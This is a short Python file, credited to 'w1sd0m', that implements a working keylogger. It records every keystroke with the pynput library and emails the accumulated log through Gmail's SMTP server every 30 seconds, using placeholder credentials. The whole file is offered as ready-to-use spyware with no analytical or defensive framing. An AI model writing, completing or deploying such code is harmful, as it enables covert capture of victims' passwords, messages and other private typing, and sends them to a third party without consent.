#the following lines of code were written by w1sd0m
import pynput.keyboard
from pynput.keyboard import Listener
import smtplib
import threading
log="--Starting--"
def callback(keys):
    global log
    print("")
    try:
        log +=str(keys.char)
    except AttributeError:
        if keys == keys.space:
            log +=" "
        elif keys == keys.backspace:
            log +=" BACKSPACE "
        elif keys == keys.enter:
            log += "\n"
        elif keys == keys.caps_lock:
            log += " CAPSLOCK "
        else:
           log +=str(keys)
    print(log)

def sending_mail(email,passwd,message):
    service = smtplib.SMTP("smtp.gmail.com", 587)
    service.starttls()
    service.login(email,passwd)
    service.sendmail(email,email,message)
    service.quit()

def thread():
    global log
    sending_mail("email_address","password",log)
    log = ""
    timer = threading.Timer(30,thread)
    timer.start()

listener = pynput.keyboard.Listener(on_press=callback)
with listener:
    thread()
    listener.join()
